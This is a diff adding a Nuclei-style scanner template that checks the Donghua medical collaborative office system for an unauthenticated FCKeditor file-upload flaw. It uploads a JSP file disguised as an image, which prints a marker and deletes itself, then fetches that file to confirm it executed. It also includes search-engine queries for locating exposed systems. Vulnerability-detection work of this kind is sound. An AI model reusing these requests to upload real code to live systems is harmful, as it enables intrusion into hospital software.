@@ -1,0 +1,58 @@
+id: donghua-fckeditor-connector-fileupload
+info:
+  name: 东华医疗协同办公系统 - 文件上传
+  author: leadlife
+  severity: critical
+  description: todo
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E4%B8%9C%E5%8D%8E%E5%8C%BB%E7%96%97%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E4%B8%9C%E5%8D%8E%E5%8C%BB%E7%96%97%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
+  metadata:
+    verified: true
+    fofa-query: body="东华医疗协同办公系统"
+    hunter-query: web.body="东华医疗协同办公系统"
+  tags: donghua,fileupload
+
+http:
+  - raw:
+      - |
+        POST /common/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&Type=&CurrentFolder=/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: JSESSIONID=17A17E4D9E4E38B72D650895AFF7D1DF
+        Content-Length: 284
+        Cache-Control: max-age=0
+        Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "Windows"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt1qdEWTI01cj5BLV
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Connection: close
+
+        ------WebKitFormBoundaryt1qdEWTI01cj5BLV
+        Content-Disposition: form-data; name="NewFile"; filename="lead.jsp"
+        Content-Type: image/jpeg
+
+        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryt1qdEWTI01cj5BLV
+        Content-Disposition: form-data; name="Submit"
+
+        upload
+        ------WebKitFormBoundaryt1qdEWTI01cj5BLV--
+      
+      - |+
+        GET /common/FCKeditor/UserFiles/lead.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
